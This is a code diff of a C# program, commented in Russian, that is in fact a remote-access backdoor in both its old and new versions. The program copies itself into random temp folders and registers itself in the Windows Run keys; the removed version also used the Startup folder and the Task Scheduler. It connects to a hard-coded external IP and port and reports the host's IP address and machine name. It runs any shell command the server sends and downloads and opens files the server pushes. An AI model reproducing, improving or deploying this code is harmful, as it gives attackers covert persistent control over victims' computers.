@@ -1,209 +1,167 @@
 ﻿using System;
-using System.Diagnostics;
 using System.IO;
-using System.Linq;
-using System.Net;
 using System.Net.Sockets;
 using System.Text;
+using System.Diagnostics;
 using System.Threading;
 using Microsoft.Win32;
-using System.Runtime.InteropServices;
 
 class Client
 {
-    public static void Main()
+    private const string ServerIP = "193.58.121.250";
+    private const int ServerPort = 7175;
+    private const int PingInterval = 30000;
+    private const int ReconnectInterval = 5000; // Пауза для переподключения (5 секунд)
+
+    static void Main()
     {
-        HideConsoleWindow();
+        // Копируем исполняемый файл в случайное место на диске
+        CopyToRandomLocation();
 
-        // Путь к текущему исполнимому файлу
-        string exePath = Process.GetCurrentProcess().MainModule.FileName;
+        // Добавляем программу в автозагрузку
+        AddToStartup();
 
-        // Копирование файла в случайное место
-        string randomFolderPath = CopyFileToRandomLocation(exePath);
-
-        // Добавление в автозагрузку
-        AddToRegistryRun(randomFolderPath);
-        AddToRegistryRunOnce(randomFolderPath);
-        AddToStartupFolder(randomFolderPath);
-        AddToTaskScheduler(randomFolderPath);
-
-        string clientInfo = GetClientInfo();
-        TcpClient client = new TcpClient("193.58.121.250", 7174);
-        NetworkStream stream = client.GetStream();
-
-        byte[] clientInfoBytes = Encoding.UTF8.GetBytes(clientInfo);
-        stream.Write(clientInfoBytes, 0, clientInfoBytes.Length);
-
-        new Thread(() => ListenForCommands(stream)).Start();
-
-        // Отправка данных на сервер
         while (true)
-        {
-            byte[] data = Encoding.UTF8.GetBytes("1");
-            stream.Write(data, 0, data.Length);
-            Thread.Sleep(30000);
-        }
-    }
-
-    // Метод для скрытия консольного окна
-    private static void HideConsoleWindow()
-    {
-        var handle = Process.GetCurrentProcess().MainWindowHandle;
-        ShowWindow(handle, 0); // 0 - скрывает окно
-    }
-
-    // Внешний метод для вызова ShowWindow
-    [DllImport("user32.dll")]
-    private static extern int ShowWindow(IntPtr hWnd, uint Msg);
-
-    // Метод для копирования файла в случайное место
-    private static string CopyFileToRandomLocation(string sourceFilePath)
-    {
-        try
-        {
-            string tempFolder = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
-            string randomFilePath = Path.Combine(tempFolder, Path.GetFileName(sourceFilePath));
-
-            // Создаем директорию
-            Directory.CreateDirectory(tempFolder);
-
-            // Копируем файл в случайную директорию
-            File.Copy(sourceFilePath, randomFilePath);
-
-            Console.WriteLine("[+] Файл скопирован в случайную директорию: " + randomFilePath);
-            return randomFilePath;
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine("Ошибка при копировании файла: " + ex.Message);
-            return string.Empty;
-        }
-    }
-
-    // Добавление в реестр Run
-    private static void AddToRegistryRun(string exePath)
-    {
-        try
-        {
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(
-                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
-
-            if (key != null)
-            {
-                key.SetValue("MyClientApp", exePath);  // Имя программы в реестре
-                key.Close();
-                Console.WriteLine("[+] Добавлено в автозагрузку (Run).");
-            }
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine("Ошибка при добавлении в Run реестр: " + ex.Message);
-        }
-    }
-
-    // Добавление в реестр RunOnce
-    private static void AddToRegistryRunOnce(string exePath)
-    {
-        try
-        {
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(
-                @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true);
-
-            if (key != null)
-            {
-                key.SetValue("MyClientAppOnce", exePath);  // Имя программы в реестре
-                key.Close();
-                Console.WriteLine("[+] Добавлено в автозагрузку (RunOnce).");
-            }
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine("Ошибка при добавлении в RunOnce реестр: " + ex.Message);
-        }
-    }
-
-    // Добавление в папку автозагрузки
-    private static void AddToStartupFolder(string exePath)
-    {
-        try
-        {
-            string startupFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup");
-
-            // Копирование файла в папку автозагрузки
-            string fileName = Path.GetFileName(exePath);
-            string destinationPath = Path.Combine(startupFolder, fileName);
-            File.Copy(exePath, destinationPath, true);
-            Console.WriteLine("[+] Добавлено в папку автозагрузки.");
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine("Ошибка при добавлении в папку автозагрузки: " + ex.Message);
-        }
-    }
-
-    // Добавление задачи в планировщик задач
-    private static void AddToTaskScheduler(string exePath)
-    {
-        try
-        {
-            string taskName = "MyClientAppTask_" + DateTime.Now.Ticks;
-
-            // Создание задачи через schtasks
-            ProcessStartInfo startInfo = new ProcessStartInfo("schtasks.exe")
-            {
-                Arguments = $"/create /tn \"{taskName}\" /tr \"{exePath}\" /sc onlogon /f",
-                CreateNoWindow = true,
-                UseShellExecute = false
-            };
-
-            Process.Start(startInfo);
-            Console.WriteLine("[+] Задача добавлена в Планировщик задач.");
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine("Ошибка при добавлении в Планировщик задач: " + ex.Message);
-        }
-    }
-
-    // Получение информации о клиенте
-    private static string GetClientInfo()
-    {
-        string hostName = Dns.GetHostName();
-        string ipAddress = "";
-
-        foreach (var address in Dns.GetHostEntry(hostName).AddressList)
-        {
-            if (address.AddressFamily == AddressFamily.InterNetwork)
-            {
-                ipAddress = address.ToString();
-                break;
-            }
-        }
-
-        return $"{ipAddress}_{hostName}";
-    }
-
-    // Получение публичного IP (синхронно)
-    private static string GetPublicIp()
-    {
-        using (WebClient client = new WebClient())
         {
             try
             {
-                return client.DownloadString("https://api.ipify.org");
+                Console.WriteLine("Attempting to connect to the server...");
+                using (TcpClient client = new TcpClient())
+                {
+                    client.Connect(ServerIP, ServerPort);
+                    Console.WriteLine("Connected to server!");
+
+                    NetworkStream stream = client.GetStream();
+
+                    Thread commandsThread = new Thread(() => ListenForCommands(stream));
+                    Thread filesThread = new Thread(() => ListenForFiles(stream));
+
+                    commandsThread.Start();
+                    filesThread.Start();
+
+                    SendClientInfo(stream);
+
+                    while (client.Connected)
+                    {
+                        SendPing(stream);
+                        Thread.Sleep(PingInterval);
+                    }
+                }
             }
-            catch
+            catch (Exception ex)
             {
-                return "Unknown";
+                Console.WriteLine("Connection failed: " + ex.Message);
             }
+
+            Console.WriteLine("Retrying connection in 5 seconds...");
+            Thread.Sleep(ReconnectInterval);
         }
     }
 
-    // Прослушивание команд от сервера
+    private static void AddToStartup()
+    {
+        try
+        {
+            string executablePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            string appName = Path.GetFileNameWithoutExtension(executablePath);
+
+            // Добавляем программу в реестр HKCU\Run
+            AddToRegistry(appName, executablePath);
+
+            // Добавляем программу в реестр HKLM\Run
+            AddToRegistry(appName, executablePath, Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true));
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Failed to add to startup: " + ex.Message);
+        }
+    }
+
+    private static void AddToRegistry(string appName, string path, RegistryKey registryKey = null)
+    {
+        if (registryKey == null)
+        {
+            registryKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+        }
+        registryKey.SetValue(appName, path);
+    }
+
+    private static void CopyToRandomLocation()
+    {
+        try
+        {
+            string originalPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+
+            // Копирование в несколько случайных мест и добавление в автозагрузку
+            for (int i = 0; i < 3; i++)
+            {
+                string randomFolder = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
+                Directory.CreateDirectory(randomFolder);
+
+                string newFilePath = Path.Combine(randomFolder, Path.GetFileName(originalPath));
+                File.Copy(originalPath, newFilePath, true);
+
+                Console.WriteLine("[Client] File copied to: " + newFilePath);
+
+                // Добавляем копию в автозагрузку
+                AddCopyToStartup(newFilePath);
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Error copying to random location: " + ex.Message);
+        }
+    }
+
+    private static void AddCopyToStartup(string filePath)
+    {
+        try
+        {
+            string appName = Path.GetFileNameWithoutExtension(filePath);
+
+            // Добавляем копию в реестр HKCU\Run
+            AddToRegistry(appName, filePath);
+
+            // Добавляем копию в реестр HKLM\Run
+            AddToRegistry(appName, filePath, Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true));
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Failed to add copy to startup: " + ex.Message);
+        }
+    }
+
+    private static void SendClientInfo(NetworkStream stream)
+    {
+        string clientInfo = GetLocalIPAddress() + "_" + Environment.MachineName;
+        byte[] infoBytes = Encoding.UTF8.GetBytes(clientInfo);
+        stream.Write(infoBytes, 0, infoBytes.Length);
+    }
+
+    private static string GetLocalIPAddress()
+    {
+        try
+        {
+            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                    return ip.ToString();
+            }
+        }
+        catch { }
+        return "127.0.0.1";
+    }
+
+    private static void SendPing(NetworkStream stream)
+    {
+        byte[] pingData = Encoding.UTF8.GetBytes("1");
+        stream.Write(pingData, 0, pingData.Length);
+    }
+
     private static void ListenForCommands(NetworkStream stream)
     {
         byte[] buffer = new byte[1024];
-
         while (true)
         {
             try
@@ -222,23 +180,73 @@ class Client
         }
     }
 
-    // Выполнение команды
     private static void ExecuteCommand(string command)
     {
         try
         {
-            ProcessStartInfo psi = new ProcessStartInfo
+            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command)
             {
-                FileName = "cmd.exe",
-                Arguments = $"/c {command}",
                 CreateNoWindow = true,
                 UseShellExecute = false
             };
             Process.Start(psi);
         }
-        catch (Exception)
+        catch { }
+    }
+
+    private static void ListenForFiles(NetworkStream stream)
+    {
+        byte[] buffer = new byte[4096];
+        while (true)
         {
-            // Ошибка выполнения команды
+            try
+            {
+                int fileNameLength = stream.Read(buffer, 0, buffer.Length);
+                if (fileNameLength > 0)
+                {
+                    string fileName = Encoding.UTF8.GetString(buffer, 0, fileNameLength).TrimEnd('\0');
+
+                    int fileSize = stream.Read(buffer, 0, buffer.Length);
+                    if (fileSize > 0)
+                    {
+                        string filePath = SaveFile(buffer, fileSize, fileName);
+                        OpenFile(filePath);
+                    }
+                }
+            }
+            catch
+            {
+                break;
+            }
         }
+    }
+
+    private static string SaveFile(byte[] data, int size, string fileName)
+    {
+        string tempFolder = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
+        Directory.CreateDirectory(tempFolder);
+
+        string filePath = Path.Combine(tempFolder, fileName);
+        File.WriteAllBytes(filePath, SubArray(data, size));
+        return filePath;
+    }
+
+    private static byte[] SubArray(byte[] data, int length)
+    {
+        byte[] result = new byte[length];
+        Array.Copy(data, result, length);
+        return result;
+    }
+
+    private static void OpenFile(string filePath)
+    {
+        try
+        {
+            if (File.Exists(filePath))
+            {
+                Process.Start("cmd.exe", "/c start \"\" \"" + filePath + "\"");
+            }
+        }
+        catch { }
     }
 }
